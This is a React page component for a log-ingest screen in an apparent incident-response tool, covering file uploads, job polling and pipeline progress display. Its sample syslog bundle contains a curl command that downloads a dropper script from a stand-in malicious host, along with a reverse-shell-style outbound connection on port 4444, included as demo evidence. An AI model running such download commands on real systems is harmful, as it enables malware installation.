import {useCallback, useEffect, useMemo, useRef, useState} from "react";
import {useNavigate} from "react-router-dom";
import {api, apiErrorMessage} from "../lib/api";
import {toast} from "sonner";
import {Archive, ArrowClockwise, FileArrowUp, Files, WarningCircle, X} from "@phosphor-icons/react";
import {PageHeader} from "../design-system";
import {HelpTip} from "../components/HelpTip";

const STEPS = [
    ["queued", "Queued"],
    ["parsing", "Parsing"],
    ["extracting", "Extracting"],
    ["correlating", "Correlating"],
    ["enriching", "Enriching"],
    ["generating", "Playbook"],
    ["done", "Complete"],
];

const SAMPLE_APACHE = `45.155.205.199 - - [01/Feb/2026:09:12:44 +0000] "GET /wp-admin HTTP/1.1" 403 512
45.155.205.199 - - [01/Feb/2026:09:12:47 +0000] "POST /wp-login.php HTTP/1.1" 401 234
45.155.205.199 - - [01/Feb/2026:09:12:50 +0000] "POST /wp-login.php HTTP/1.1" 200 8912
`;
const SAMPLE_SYSLOG = `Feb  1 09:13:02 web01 sshd[2211]: Failed password for root from 45.155.205.199 port 34521 ssh2
Feb  1 09:13:05 web01 sshd[2211]: Failed password for admin from 45.155.205.199 port 34521 ssh2
Feb  1 09:13:44 web01 bash[3120]: /usr/bin/curl -sSL http://malicious-hive.top/dropper.sh -o /tmp/x.sh
Feb  1 09:14:10 web01 kernel: outbound connection to 185.220.101.44:4444 CVE-2021-44228
`;
const SAMPLE_CSV = `timestamp,action,src_ip,dst_ip,dst_port,protocol
2026-02-01T09:14:10,BLOCK,45.155.205.199,10.0.0.5,4444,tcp
2026-02-01T09:14:12,BLOCK,45.155.205.199,10.0.0.5,4444,tcp
2026-02-01T09:15:00,ALLOW,10.0.0.5,185.220.101.44,443,tcp
`;

const MAX_FILE_SIZE_BYTES = 25 * 1024 * 1024; // 25 MB limit per file

function fmtSize(n) {
    if (n < 1024) return `${n} B`;
    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
    return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

export default function Upload() {
    const [jobs, setJobs] = useState([]);
    const [queue, setQueue] = useState([]); // pending files
    const [dragOver, setDragOver] = useState(false);
    const [uploading, setUploading] = useState(false);
    const inputRef = useRef(null);
    const nav = useNavigate();
    const prevStatusRef = useRef({});

    const refresh = useCallback(
        () =>
            api
                .get("/logs/jobs", {silentError: true})
                .then((r) => {
                    const next = Array.isArray(r.data) ? r.data : [];
                    const prev = prevStatusRef.current || {};
                    next.forEach((j) => {
                        if (!j?.id) return;
                        const was = prev[j.id];
                        if (j.status === "failed" && was && was !== "failed") {
                            toast.error(`Pipeline failed: ${j.filename || j.id.slice(0, 8)}`, {
                                description: j.error || "See job details for the error message.",
                                duration: 9000,
                                id: `job-fail-${j.id}`,
                            });
                        }
                        if (j.status === "done" && was && was !== "done" && was !== "failed") {
                            toast.success(`Pipeline complete: ${j.filename || j.id.slice(0, 8)}`, {
                                id: `job-done-${j.id}`,
                            });
                        }
                    });
                    const map = {};
                    next.forEach((j) => {
                        if (j?.id) map[j.id] = j.status;
                    });
                    prevStatusRef.current = map;
                    setJobs(next);
                })
                .catch(() => {
                    // Keep existing list on transient poll failures
                }),
        [],
    );

    useEffect(() => {
        refresh();
        const t = setInterval(refresh, 3000);
        return () => clearInterval(t);
    }, [refresh]);

    const addFiles = useCallback((fs) => {
        const arr = Array.from(fs || []);
        const validFiles = arr.filter((f) => {
            if (f.size > MAX_FILE_SIZE_BYTES) {
                toast.error(`File "${f.name}" exceeds the 25 MB limit and was skipped.`);
                return false;
            }
            return true;
        });

        setQueue((prev) => {
            const combined = [...prev, ...validFiles];
            if (combined.length > 20) {
                toast.warning("Maximum queue limit is 20 files. Truncated excess selections.");
            }
            return combined.slice(0, 20);
        });
    }, []);

    const removeQueued = (idx) => setQueue((q) => q.filter((_, i) => i !== idx));

    const resumeJob = useCallback(
        async (jobId) => {
            try {
                await api.post(`/logs/jobs/${jobId}/resume`);
                toast.success("Job re-queued — pipeline will resume shortly");
                refresh();
            } catch (e) {
                toast.error(e?.userMessage || apiErrorMessage(e, "Could not resume job"));
            }
        },
        [refresh],
    );

    const submit = useCallback(async () => {
        if (queue.length === 0) return;
        setUploading(true);
        const fd = new FormData();
        queue.forEach((f) => fd.append("files", f));
        try {
            const r = await api.post("/logs/upload-batch", fd, {
                headers: {"Content-Type": "multipart/form-data"},
            });
            toast.success(`Uploaded ${queue.length} file(s) — pipeline running (${r.data.mode} mode)`);
            setQueue([]);
            refresh();
        } catch (e) {
            toast.error(e?.userMessage || apiErrorMessage(e, "Upload failed"));
        } finally {
            setUploading(false);
        }
    }, [queue, refresh]);

    const loadSampleBundle = useCallback(() => {
        const mk = (name, content, type = "text/plain") =>
            new File([new Blob([content], {type})], name, {type});
        setQueue([
            mk("apache.log", SAMPLE_APACHE),
            mk("syslog.log", SAMPLE_SYSLOG),
            mk("firewall.csv", SAMPLE_CSV, "text/csv"),
        ]);
        toast.info("3-file incident bundle staged — click Run pipeline");
    }, []);

    const totalQueueSize = useMemo(() => queue.reduce((acc, f) => acc + f.size, 0), [queue]);

    return (
        <div data-testid="upload-page" className="space-y-6">
            <PageHeader
                testid="upload-header"
                title="Ingest Logs"
                icon={FileArrowUp}
                subtitle="Drop a single log, multiple logs, or an incident-package ZIP. Formats auto-detected (Apache, Nginx, Syslog, JSON, CSV, CEF, LEEF, CloudTrail). Events normalize into CES and correlate into a single incident."
                tip={
                    <HelpTip
                        title="Log ingest"
                        body="Upload evidence packages. Multi-file ZIPs are expanded safely (zip-bomb limits). Events normalize into CES, correlate into one incident, then run IoC → TI → ATT&CK → playbook."
                        how="POST /logs (or batch). Jobs appear below with status until the pipeline finishes."
                        testid="tip-upload-page"
                    />
                }
                actions={
                    <div className="flex items-center gap-2">
                        <button
                            type="button"
                            onClick={loadSampleBundle}
                            className="soc-btn-secondary !text-xs !h-9 inline-flex items-center gap-1.5"
                            data-testid="load-sample-bundle-header"
                        >
                            <Files size={14}/>
                            Stage 3-File Bundle
                        </button>
                        <button
                            type="button"
                            onClick={refresh}
                            className="soc-btn-secondary !text-xs !h-9 inline-flex items-center gap-1.5"
                            data-testid="refresh-jobs-btn"
                            title="Refresh job status list"
                        >
                            <ArrowClockwise size={14}/>
                            Refresh
                        </button>
                    </div>
                }
            />

            <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
                <div className="lg:col-span-2 space-y-4">
                    <div
                        data-testid="drop-zone"
                        onDragOver={(e) => {
                            e.preventDefault();
                            setDragOver(true);
                        }}
                        onDragLeave={() => setDragOver(false)}
                        onDrop={(e) => {
                            e.preventDefault();
                            setDragOver(false);
                            addFiles(e.dataTransfer.files);
                        }}
                        onClick={() => inputRef.current?.click()}
                        className={`soc-card p-8 border-dashed cursor-pointer transition-colors relative overflow-hidden ${
                            dragOver ? "border-primary/80 bg-primary/10 shadow-lg" : "hover:border-primary/40"
                        }`}
                    >
                        <input
                            type="file"
                            multiple
                            ref={inputRef}
                            className="hidden"
                            data-testid="file-input"
                            onChange={(e) => addFiles(e.target.files)}
                        />
                        <div className="flex items-start gap-3">
                            <FileArrowUp size={36} className="text-primary shrink-0 animate-bounce"/>
                            <div>
                                <div className="font-semibold text-lg leading-tight">
                                    Drop logs or a ZIP package
                                </div>
                                <div className="text-xs text-muted-foreground mt-1">
                                    Single file, multi-file, or incident-package ZIP · max 20 files · 25 MB each
                                </div>
                            </div>
                        </div>
                        <div
                            className="mt-5 flex flex-wrap items-center gap-2 text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                            <span className="px-2 py-0.5 rounded border border-border bg-background">apache</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">syslog</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">json</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">csv</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">cef</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">leef</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">cloudtrail</span>
                            <span className="px-2 py-0.5 rounded border border-border bg-background">zip</span>
                        </div>
                    </div>

                    {queue.length > 0 && (
                        <div className="soc-card p-4 border-primary/30 bg-primary/[0.02]">
                            <div className="flex items-center justify-between mb-3">
                                <div>
                                    <div className="soc-label">Staged Files ({queue.length}/20)</div>
                                    <div className="text-[10px] text-muted-foreground font-mono mt-0.5">
                                        Total payload: {fmtSize(totalQueueSize)}
                                    </div>
                                </div>
                                <div className="flex items-center gap-2">
                                    <button
                                        data-testid="clear-queue"
                                        onClick={() => setQueue([])}
                                        className="text-[11px] text-muted-foreground hover:text-error transition-colors px-2 py-1 rounded"
                                    >
                                        Clear all
                                    </button>
                                    <button
                                        data-testid="submit-batch"
                                        onClick={submit}
                                        disabled={uploading}
                                        className="text-xs px-3.5 py-1.5 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold rounded transition-colors disabled:opacity-50 inline-flex items-center gap-1.5 shadow-sm"
                                    >
                                        {uploading ? (
                                            <>
                                                <span
                                                    className="w-3 h-3 border-2 border-primary-foreground border-t-transparent rounded-full animate-spin"/>
                                                Uploading…
                                            </>
                                        ) : (
                                            "Run pipeline →"
                                        )}
                                    </button>
                                </div>
                            </div>
                            <div className="space-y-1.5 max-h-56 overflow-y-auto pr-1">
                                {queue.map((f, i) => (
                                    <div key={`${f.name}-${i}`}
                                         className="flex items-center justify-between text-[12px] px-2.5 py-1.5 bg-background rounded border border-border"
                                         data-testid={`staged-${i}`}>
                                        <div className="flex items-center gap-2 min-w-0">
                                            {f.name.endsWith(".zip") ?
                                                <Archive size={14} className="text-warning shrink-0"/> :
                                                <Files size={14} className="text-primary shrink-0"/>}
                                            <span className="soc-mono truncate font-medium">{f.name}</span>
                                        </div>
                                        <div className="flex items-center gap-3 shrink-0">
                                            <span
                                                className="text-muted-foreground font-mono text-[10px]">{fmtSize(f.size)}</span>
                                            <button onClick={() => removeQueued(i)}
                                                    className="text-muted-foreground hover:text-error transition-colors p-1"
                                                    title="Remove file">
                                                <X size={12}/>
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}

                    <div className="soc-card p-4 text-xs text-muted-foreground leading-relaxed">
                        <div className="soc-label mb-2 text-foreground">Pipeline Execution Flow</div>
                        <ol className="space-y-1.5 font-mono text-[11px]">
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">1.</span> Format detection per file → CES
                                normalization
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">2.</span> Cross-log correlation (IP · user · host ·
                                hash · domain)
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">3.</span> IoC extraction + parallel threat-intel
                                enrichment
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">4.</span> MITRE ATT&CK technique inference
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">5.</span> Citation-grounded playbook via LLM
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">6.</span> HiTL routing on critical severity / low
                                grounding
                            </li>
                        </ol>
                    </div>
                </div>

                <div className="lg:col-span-3 soc-card p-0 overflow-hidden">
                    <div className="px-4 py-3 border-b border-border flex items-center justify-between bg-muted/20">
                        <div className="soc-label">Recent Jobs Queue</div>
                        <div className="text-[10px] text-muted-foreground font-mono">auto-refresh · 3s interval</div>
                    </div>
                    <div className="divide-y divide-border">
                        {jobs.length === 0 && (
                            <div className="text-center text-muted-foreground text-xs py-14 space-y-2">
                                <Files size={32} className="mx-auto opacity-40 text-muted-foreground"/>
                                <div>No ingestion jobs recorded yet</div>
                                <div className="text-[11px] text-muted-foreground/80">Drop files or stage the sample
                                    bundle to initiate evaluation.
                                </div>
                            </div>
                        )}
                        {jobs.map((j) => {
                            const idx = STEPS.findIndex(([k]) => k === j.status);
                            const isFail = j.status === "failed";
                            const canResume =
                                isFail ||
                                (j.status !== "done" &&
                                    (j.queue_state === "running" ||
                                        j.error ||
                                        (j.status !== "queued" && j.progress != null && j.progress < 100)));
                            return (
                                <div key={j.id} className="p-4 hover:bg-muted/[0.03] transition-colors">
                                    <div className="flex items-center justify-between mb-2">
                                        <div className="min-w-0">
                                            <div className="flex items-center gap-2">
                                                {j.mode === "zip" ?
                                                    <Archive size={14} className="text-warning shrink-0"/> :
                                                    j.mode === "batch" ?
                                                        <Files size={14} className="text-primary shrink-0"/> : null}
                                                <div
                                                    className="text-sm font-medium text-foreground truncate">{j.filename}</div>
                                                <span
                                                    className="text-[9px] uppercase tracking-[0.14em] px-1.5 py-0.5 rounded bg-muted text-muted-foreground font-mono">
                          {j.mode || "single"}
                        </span>
                                            </div>
                                            <div
                                                className="soc-mono text-[10px] text-muted-foreground mt-0.5 flex items-center gap-2">
                                                <span>ID: {j.id.slice(0, 8)}</span>
                                                <span>·</span>
                                                <span>{fmtSize(j.size)}</span>
                                                {j.files && j.files.length > 1 && (
                                                    <>
                                                        <span>·</span>
                                                        <span>{j.files.length} files</span>
                                                    </>
                                                )}
                                            </div>
                                        </div>
                                        <div className="flex items-center gap-2">
                                            {j.status === "done" && j.incident_ids?.[0] && (
                                                <button
                                                    data-testid={`job-view-${j.id}`}
                                                    onClick={() => nav(`/incidents/${j.incident_ids[0]}`)}
                                                    className="text-[11px] px-2.5 py-1 bg-success-soft border border-[var(--success-border)] text-success rounded hover:brightness-95 transition-colors font-medium"
                                                >
                                                    Open incident →
                                                </button>
                                            )}
                                            {canResume && j.status !== "done" && (
                                                <button
                                                    type="button"
                                                    data-testid={`job-resume-${j.id}`}
                                                    onClick={() => resumeJob(j.id)}
                                                    className="text-[11px] px-2.5 py-1 bg-amber-500/10 border border-amber-500/40 text-amber-200 rounded hover:bg-amber-500/20 transition-colors font-medium"
                                                    title="Re-queue this job if the durable payload still exists"
                                                >
                                                    Resume
                                                </button>
                                            )}
                                            <span
                                                data-testid={`job-status-${j.id}`}
                                                className={`text-[10px] uppercase tracking-[0.14em] font-semibold px-2 py-0.5 rounded ${
                                                    isFail ? "bg-error-soft text-error border border-[var(--error-border)]" :
                                                        j.status === "done" ? "bg-success-soft text-success border border-[var(--success-border)]" :
                                                            "bg-primary/10 text-primary border border-primary/20"
                                                }`}
                                            >
                        {j.status}
                      </span>
                                            {(j.pipeline_total_ms != null || j.stage_timings?.total_ms != null) && (
                                                <span
                                                    data-testid={`job-timing-${j.id}`}
                                                    className="text-[10px] font-mono text-muted-foreground"
                                                    title={
                                                        j.stage_timings?.by_stage_ms
                                                            ? Object.entries(j.stage_timings.by_stage_ms)
                                                                .map(([k, v]) => `${k}: ${v}ms`)
                                                                .join(" · ")
                                                            : "Pipeline wall-clock time"
                                                    }
                                                >
                                                    {Number(j.pipeline_total_ms ?? j.stage_timings?.total_ms).toFixed(0)}ms
                                                </span>
                                            )}
                                        </div>
                                    </div>

                                    {j.files_meta?.length > 0 && (
                                        <div className="grid grid-cols-2 gap-1.5 mb-3">
                                            {j.files_meta.map((m) => (
                                                <div key={m.file}
                                                     className="text-[10px] flex items-center justify-between px-2.5 py-1 rounded bg-background border border-border">
                                                    <span
                                                        className="soc-mono truncate font-medium">{m.file.split("/").pop()}</span>
                                                    <span className="text-primary font-mono">
                            <span className="text-muted-foreground">{m.format}</span> · {m.events} evt
                          </span>
                                                </div>
                                            ))}
                                        </div>
                                    )}

                                    <div className="grid grid-cols-7 gap-1 mt-3">
                                        {STEPS.map(([k, label], i) => {
                                            const active = idx >= i && !isFail;
                                            const current = idx === i && !isFail && k !== "done";
                                            return (
                                                <div key={k} className="flex flex-col items-center gap-1">
                                                    <div
                                                        className={`h-1.5 w-full rounded-full transition-all duration-300 ${
                                                            isFail ? "bg-[var(--error)]/40" :
                                                                active ? "bg-primary" : "bg-muted"
                                                        } ${current ? "animate-pulse ring-2 ring-primary/20" : ""}`}/>
                                                    <div
                                                        className={`text-[9px] tracking-wider uppercase font-mono ${active ? "text-primary font-semibold" : "text-muted-foreground/70"}`}>
                                                        {label}
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                    {j.error && (
                                        <div
                                            className="mt-2.5 text-[11px] text-error bg-error-soft p-2 rounded border border-[var(--error-border)] flex items-start gap-1.5">
                                            <WarningCircle size={14} className="shrink-0 mt-0.5"/>
                                            <span className="font-mono break-all">Error: {j.error}</span>
                                        </div>
                                    )}
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
        </div>
    );
}